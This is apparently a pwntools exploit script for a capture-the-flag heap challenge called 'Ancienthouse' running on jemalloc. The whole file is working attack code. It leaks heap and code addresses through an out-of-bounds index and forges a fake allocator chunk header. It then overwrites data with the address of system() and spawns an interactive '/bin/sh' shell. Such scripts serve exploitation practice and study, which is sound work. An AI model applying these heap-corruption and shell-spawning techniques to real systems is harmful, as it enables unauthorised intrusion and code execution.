from pwn import *
import sys
import os

remote_ip,port = 'localhost','6969'
binary = './Ancienthouse'
brkpts = '''

'''
#context.terminal = ['tmux','splitw','-h']
if sys.argv[1] == 'remote' :
    io = remote(remote_ip,port)

else:
    io = process(binary, env={"LD_PRELOAD":"./libjemalloc.so"})
    
re = lambda a: io.recv(a)
ru = lambda a: io.recvuntil(a)
rl = lambda  : io.recvline()
s  = lambda a: io.send(a)
sl = lambda a: io.sendline(a)
sla= lambda a,b: io.sendlineafter(a,b)
sa = lambda a,b: io.sendafter(a,b)

def add(name,size):
    sla(">> ",str(1))
    sla("size : ",str(size))
    sla("name : ",name)

def battle(idx):
    sla(">> ",str(2))
    sla("id : ",str(idx))

def merge(idx1,idx2):
    sla(">> ",str(3))
    sla("id 1: ",str(idx1))
    sla("id 2: ",str(idx2))

if __name__ == "__main__":

    sl(b"/bin/sh")

    add("a"*0x20,0x40)
    add("b"*0x20,0x40)

    for i in range(7):
        battle(1)
    sla(">>","1")
    
    for i in range(7):
        battle(0)
    sla(">>","1")

    add("c",0x20)
    
    battle(2)

    ru("battle with ")
    leak = u64(re(6).ljust(8,b"\x00")) ^ 0xa63
    log.info("heap base : "+ hex(leak))

    battle(-7) #for large no of allocaions      

    ru("battle with ")
    code = u64(re(6).ljust(8,b"\x00"))-8
    log.info("code leak : "+ hex(code) )
       
    sla(">>","2")
    
    for i in range(61):
        add("zz",0x40)
    add("z"*0x40,0x40)
    gdb.attach(io,brkpts)
    
    for i in range(7):
        battle(64)
    sla(">>","1")

    system = code - 0x2e90 
    fake_header =  p32(0x0) + p64(leak+0x800d70) + p64(0x0000003100000001) + p64(0x0003ffffffffffff)

    add("x"*0x20,0x20)
    add(fake_header,0x20)
    merge(65,66)

    add(p64(system) + p64(leak+0x7040), 0x50)

    io.interactive()
    
